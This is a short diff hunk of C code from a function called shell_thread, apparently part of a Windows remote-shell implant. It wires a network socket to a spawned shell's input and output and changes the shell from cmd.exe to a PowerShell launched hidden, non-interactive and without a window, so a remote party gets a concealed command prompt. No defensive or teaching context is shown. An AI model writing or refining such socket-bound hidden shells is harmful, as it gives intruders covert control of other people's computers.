@@ -86,10 +86,12 @@ static DWORD WINAPI shell_thread(LPVOID param) {
     si.hStdError   = (HANDLE)s;
 
     PROCESS_INFORMATION pi = {0};
-    char cmd[] = "cmd.exe";
+    char cmd[] = "powershell.exe -NoExit -NoP -NonI -W Hidden";
 
-    if(!CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
-                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+    if(!CreateProcessA(
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        cmd, NULL, NULL, TRUE,
+        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         closesocket(s);
         WSACleanup();
         return 1;
